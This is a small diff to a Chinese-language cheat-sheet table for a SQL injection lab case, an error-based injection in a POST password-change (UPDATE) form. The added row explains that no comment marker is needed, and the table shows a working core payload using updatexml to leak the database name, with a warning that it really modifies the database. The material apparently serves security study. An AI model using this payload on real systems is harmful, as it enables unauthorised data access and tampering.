@@ -6,6 +6,7 @@
 |---|---|
 | **注入类型** | POST · UPDATE 注入 |
 | **闭合方式** | `'` |
+| **注释符** | `不需要 · payload 用 or ... or 包裹` |
 | **成败信号** | XPATH 报错 |
 | **一句话** | 改密码处注入（会真的改库） |
 | **核心 payload** | `passwd=' or updatexml(1,concat(0x7e,database()),1) or '` |
